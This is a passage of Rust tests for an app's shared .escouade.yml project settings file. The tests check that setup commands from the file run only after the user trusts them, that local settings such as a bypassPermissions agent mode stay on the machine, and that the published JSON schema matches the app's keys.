    let mut kept = pf::keep_local(&before, &mut p);
    kept.sort();
    assert_eq!(kept, ["board.effort", "board.mode", "board.model"]);
    // Unticked in the window: kept too.
    let before = p.clone();
    p.private = false;
    assert_eq!(pf::keep_local(&before, &mut p), ["private"]);
}

#[test]
fn the_fingerprint_follows_the_commands() {
    let a: BTreeMap<String, Value> = [("launch".to_string(), json!([{ "command": "a" }]))].into();
    let b: BTreeMap<String, Value> = [("launch".to_string(), json!([{ "command": "b" }]))].into();
    assert_eq!(pf::fingerprint(&a), pf::fingerprint(&a.clone()));
    assert_ne!(pf::fingerprint(&a), pf::fingerprint(&b));
}

/// The schema the repository publishes (`schemas/escouade.schema.json`, served by the site) is the
/// one the keys make: `ESCOUADE_WRITE_SCHEMA=1` writes it again.
#[test]
fn the_published_schema_is_up_to_date() {
    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("..");
    let made = serde_json::to_string_pretty(&pf::schema()).unwrap() + "\n";
    let files = [
        root.join("schemas/escouade.schema.json"),
        root.join("website/public/schemas/escouade.schema.json"),
    ];
    if std::env::var_os("ESCOUADE_WRITE_SCHEMA").is_some() {
        for f in &files {
            std::fs::create_dir_all(f.parent().unwrap()).unwrap();
            std::fs::write(f, &made).unwrap();
        }
    }
    // Compared as JSON: Prettier lays the files out its own way (`npm run format` after writing).
    for f in &files {
        let published: Value =
            serde_json::from_str(&std::fs::read_to_string(f).unwrap_or_default())
                .unwrap_or_default();
        assert_eq!(
            published,
            pf::schema(),
            "{} is not the schema of the keys: run the test with ESCOUADE_WRITE_SCHEMA=1",
            f.display()
        );
    }
    // Every key is in it, at its place.
    let s = pf::schema();
    for k in pf::KEYS {
        let at = match k.path.split_once('.') {
            Some((g, n)) => &s["properties"][g]["properties"][n],
            None => &s["properties"][k.path],
        };
        assert!(at.is_object(), "{} missing", k.path);
    }
}

// ---------- in the app ----------

use crate::core_tests::{harness, repo, Harness};
use std::path::Path;

const SHARED: &str = "\
version: 1
worktrees:
  per_agent: true
  setup:
    - node -e \"require('fs').writeFileSync('ran.txt', 'yes')\"
git:
  agent_branch_prefix: team/
board:
  merge_strategy: rebase
  draft_pr: true
";

fn toasts(h: &Harness) -> Vec<String> {
    h.events
        .lock()
        .iter()
        .filter(|e| e["type"] == "toast")
        .map(|e| e["text"].as_str().unwrap_or_default().to_string())
        .collect()
}

async fn shared_project(h: &Harness, text: &str) -> (Project, std::path::PathBuf) {
    let r = repo(&h.dir);
    std::fs::write(r.join(pf::FILE), text).unwrap();
    let p = h
        .core
        .create_project(&r.to_string_lossy(), "demo", "", false, None, true)
        .await
        .unwrap();
    (p, r)
}

/// The agent's worktree, once its agent runs (its setup over, if it had one).
async fn agent_worktree(h: &Harness, project_id: &str) -> std::path::PathBuf {
    let id = h.core.create_agent(project_id, None).await.unwrap().meta.id;
    // Started, its worktree made (at the start, when it waits for a first message: ESC-156).
    h.core.ensure_process(&id).await.unwrap();
    h.wait("agent started", |h| h.alive(&id)).await;
    std::path::PathBuf::from(h.agent(&id).worktree.unwrap().path)
}

#[tokio::test]
async fn a_project_added_with_a_file_is_set_up_by_it_its_commands_run_once_trusted() {
    let h = harness("pf-open");
    let (p, _r) = shared_project(&h, SHARED).await;
    // Set up by the file, though added without worktrees, and said.
    assert!(p.worktree_per_agent);
    assert_eq!(p.agent_branch_prefix, "team/");
    assert_eq!(p.board.strategy, "rebase");
    assert!(p.board.draft);
    assert!(
        toasts(&h).iter().any(|t| t.contains(pf::FILE)),
        "{:?}",
        toasts(&h)
    );
    // Its setup waits for the user: none in the project.
    assert!(p.worktree_setup.is_empty());
    let pending = p.shared.file.as_ref().unwrap().pending.clone().unwrap();
    assert!(pending.commands.contains_key("worktrees.setup"));
    // Saved with it: a project read again from its state knows what was kept and trusted.
    assert_eq!(h.core.project(&p.id).unwrap().board.strategy, "rebase");

    // An agent's worktree: the file's branch prefix, and nothing of its setup ran.
    let wt = agent_worktree(&h, &p.id).await;
    assert!(crate::core_tests::git(&wt, &["branch", "--show-current"]).starts_with("team/"));
    assert!(!wt.join("ran.txt").exists());

    // Trusted only as read: other commands are refused.
    assert!(h.core.trust_shared(&p.id, "something-else").is_err());
    let p = h.core.trust_shared(&p.id, &pending.hash).unwrap();
    assert_eq!(p.worktree_setup.len(), 1);
    assert!(p.shared.file.as_ref().unwrap().pending.is_none());
    let wt = agent_worktree(&h, &p.id).await;
    assert_eq!(std::fs::read_to_string(wt.join("ran.txt")).unwrap(), "yes");
}

#[tokio::test]
async fn the_file_changed_is_read_again_its_new_commands_asked_again() {
    let h = harness("pf-again");
    let (p, r) = shared_project(&h, SHARED).await;
    let hash = p.shared.file.unwrap().pending.unwrap().hash;
    h.core.trust_shared(&p.id, &hash).unwrap();
    // Read again as the file is: nothing happens.
    assert!(h.core.read_shared(&p.id, false).is_none());

    // A pull changes it: the strategy follows; the new setup waits, the trusted one stays.
    let changed = SHARED
        .replace("rebase", "merge")
        .replace("'yes'", "'other'");
    std::fs::write(r.join(pf::FILE), changed).unwrap();
    h.events.lock().clear();
    let p = h.core.read_shared(&p.id, false).unwrap();
    assert_eq!(p.board.strategy, "merge");
    assert!(p.worktree_setup[0].command.contains("'yes'"));
    let pending = p.shared.file.unwrap().pending.unwrap();
    assert_ne!(pending.hash, hash);
    let said = toasts(&h);
    assert_eq!(said.len(), 2, "{said:?}");

    // The folder watched reads it by itself.
    std::fs::write(r.join(pf::FILE), SHARED.replace("rebase", "squash")).unwrap();
    h.core.compute_git(&p.id).await;
    assert_eq!(h.core.project(&p.id).unwrap().board.strategy, "squash");

    // Gone: the project keeps its settings, the file no longer marks them.
    std::fs::remove_file(r.join(pf::FILE)).unwrap();
    let p = h.core.read_shared(&p.id, false).unwrap();
    assert!(p.shared.file.is_none());
    assert_eq!(p.board.strategy, "squash");
}

#[tokio::test]
async fn a_setting_set_in_the_window_goes_before_the_file_until_written_into_it() {
    let h = harness("pf-local");
    let (p, r) = shared_project(&h, SHARED).await;
    // The window sets the strategy and a setting the file leaves alone.
    let board = BoardSettings {
        strategy: "squash".into(),
        cleanup: false,
        ..p.board.clone()
    };
    let p = h.core.board_set(&p.id, board).unwrap();
    assert_eq!(p.shared.local, ["board.merge_strategy"]);
    assert!(toasts(&h).iter().any(|t| t.contains(pf::FILE)));
    h.core
        .update_project(Project {
            agent_branch_prefix: "mine/".into(),
            ..h.core.project(&p.id).unwrap()
        })
        .unwrap();
    let p = h.core.project(&p.id).unwrap();
    assert_eq!(
        p.shared.local,
        ["board.merge_strategy", "git.agent_branch_prefix"]
    );

    // The file changes them: this machine's values go first.
    std::fs::write(
        r.join(pf::FILE),
        SHARED
            .replace("rebase", "merge")
            .replace("team/", "crew/")
            .replace("draft_pr: true", "draft_pr: false"),
    )
    .unwrap();
    let p = h.core.read_shared(&p.id, false).unwrap();
    assert_eq!(p.board.strategy, "squash");
    assert_eq!(p.agent_branch_prefix, "mine/");
    assert!(!p.board.draft);

    // « Écrire dans .escouade.yml »: the file takes it, nothing is apart any more.
    let p = h
        .core
        .write_shared(&p.id, Some(vec!["board.merge_strategy".into()]))
        .unwrap();
    assert_eq!(p.shared.local, ["git.agent_branch_prefix"]);
    let text = std::fs::read_to_string(r.join(pf::FILE)).unwrap();
    assert!(text.contains("merge_strategy: squash"), "{text}");
    assert!(text.contains("crew/"), "{text}");
    // « Reprendre la valeur du fichier »: the file's prefix again.
    let p = h
        .core
        .unkeep_shared(&p.id, "git.agent_branch_prefix")
        .unwrap();
    assert!(p.shared.local.is_empty());
    assert_eq!(p.agent_branch_prefix, "crew/");
}

/// The tickets' agents set in the window over the file's (ESC-163): kept on this machine, written
/// into the file but `bypassPermissions`, which stays this machine's; the agents in parallel and
/// the autopilot are no business of the file.
#[tokio::test]
async fn the_tickets_agents_set_in_the_window_are_written_but_bypass_permissions() {
    let h = harness("pf-agents");
    let (p, r) = shared_project(
        &h,
        "version: 1\nprivate: true\nboard:\n  model: opus\n  mode: plan\n",
    )
    .await;
    assert!(p.private);
    assert_eq!((&*p.board.model, &*p.board.mode), ("opus", "plan"));
    let board = BoardSettings {
        model: "sonnet".into(),
        mode: "bypassPermissions".into(),
        max_parallel: 4,
        autopilot: false,
        ..p.board.clone()
    };
    let p = h.core.board_set(&p.id, board).unwrap();
    let mut local = p.shared.local.clone();
    local.sort();
    assert_eq!(local, ["board.mode", "board.model"]);
    let p = h.core.write_shared(&p.id, Some(local.clone())).unwrap();
    assert_eq!(p.shared.local, ["board.mode"]);
    assert_eq!(p.board.mode, "bypassPermissions");
    let text = std::fs::read_to_string(r.join(pf::FILE)).unwrap();
    assert!(text.contains("model: sonnet"), "{text}");
    assert!(text.contains("mode: plan"), "{text}");
    // Exported whole: the same.
    let p = h.core.write_shared(&p.id, None).unwrap();
    assert_eq!(p.board.mode, "bypassPermissions");
    let text = std::fs::read_to_string(r.join(pf::FILE)).unwrap();
    assert!(!text.contains("bypass"), "{text}");
    assert!(
        !text.contains("parallel") && !text.contains("autopilot"),
        "{text}"
    );
    assert!(text.contains("private: true"), "{text}");
}

#[tokio::test]
async fn exported_the_project_s_settings_make_its_file_its_commands_trusted() {
    let h = harness("pf-export");
    let (p, r) = h.project(true).await;
    h.core
        .update_project(Project {
            worktree_setup: vec![crate::core_tests::wt_step("npm ci", "")],
            run_commands: vec![RunCommand {
                id: "r".into(),
                name: "web".into(),
                command: "npm run dev".into(),
                shell: String::new(),
                cwd: String::new(),
            }],
            ..h.core.project(&p.id).unwrap()
        })
        .unwrap();
    let p = h.core.write_shared(&p.id, None).unwrap();
    let text = std::fs::read_to_string(Path::new(&r).join(pf::FILE)).unwrap();
    assert!(
        text.starts_with("# yaml-language-server: $schema="),
        "{text}"
    );
    let back = pf::read(&text).unwrap();
    assert!(back.warnings.is_empty(), "{:?}", back.warnings);
    assert_eq!(back.values["worktrees.per_agent"], json!(true));
    assert_eq!(back.values["launch"][0]["command"], json!("npm run dev"));
    // Its own commands: nothing to approve, nothing kept apart.
    let file = p.shared.file.unwrap();
    assert!(file.pending.is_none());
    assert_eq!(file.keys.len(), pf::KEYS.len() - 1, "no target branch yet");
    assert!(p.shared.local.is_empty());
    assert_eq!(p.run_commands[0].id, "r");
}

#[tokio::test]
async fn the_assistant_s_preview_has_the_file_s_settings_but_never_its_commands() {
    let h = harness("pf-preview");
    let r = repo(&h.dir);
    assert!(pf::preview(&r.to_string_lossy()).is_none());
    std::fs::write(r.join(pf::FILE), SHARED).unwrap();
    let p = pf::preview(&format!("{}/", r.to_string_lossy())).unwrap();
    assert!(p.worktree_per_agent);
    assert!(p.worktree_setup.is_empty());
    assert!(p.shared.file.unwrap().pending.is_some());
}

#[tokio::test]
async fn an_unreadable_file_changes_nothing_and_says_why() {
    let h = harness("pf-broken");
    let (p, _r) = shared_project(&h, "worktrees:\n  per_agent: [true\n").await;
    assert!(!p.worktree_per_agent);
    let file = p.shared.file.unwrap();
    assert!(file.error.is_some());
    assert!(toasts(&h).iter().any(|t| t.contains(pf::FILE)));
}

/// The forms the site's page gives (website/content/docs/*/escouade-yml.md).
#[test]
fn the_forms_the_documentation_gives_are_read_as_it_says() {
    let r = read(
        "worktrees:\n  copy: config/local.json\n  setup: npm ci\n  teardown: [docker compose down]\nboard:\n  target_branch: ~\n  test_command: ''\n  draft_pr: True\nbord:\n  x: 1\nlaunch:\n  - command: npm run docs\n  - npm start\n",
    );
    assert_eq!(r.values["worktrees.copy"], json!(["config/local.json"]));
    assert_eq!(
        r.values["worktrees.setup"],
        json!([{ "command": "npm ci", "shell": "", "cwd": "" }])
    );
    assert_eq!(
        r.values["worktrees.teardown"],
        json!([{ "command": "docker compose down", "shell": "", "cwd": "" }])
    );
    assert_eq!(r.values["board.target_branch"], json!(""));
    assert_eq!(r.values["board.test_command"], json!(""));
    assert_eq!(r.values["board.draft_pr"], json!(true));
    // A launch command without a name is named by its command; one in short form is refused.
    assert_eq!(
        r.values["launch"],
        json!([{ "name": "npm run docs", "command": "npm run docs", "shell": "", "cwd": "" }])
    );
    // No version: said; the unknown group proposes the known one; the short launch item is told.
    assert_eq!(lines(&r.warnings), vec![None, Some(9), Some(13)]);
    assert!(r.warnings[1].text.contains("board"), "{:?}", r.warnings);
    assert_eq!(
        read("worktrees:\n  copy: ['*.local']\n").values["worktrees.copy"],
        json!(["*.local"])
    );
    // A single launch command, without a list, is a list of one.
    assert_eq!(
        read("launch:\n  name: web\n  command: npm run dev\n").values["launch"],
        json!([{ "name": "web", "command": "npm run dev", "shell": "", "cwd": "" }])
    );
}
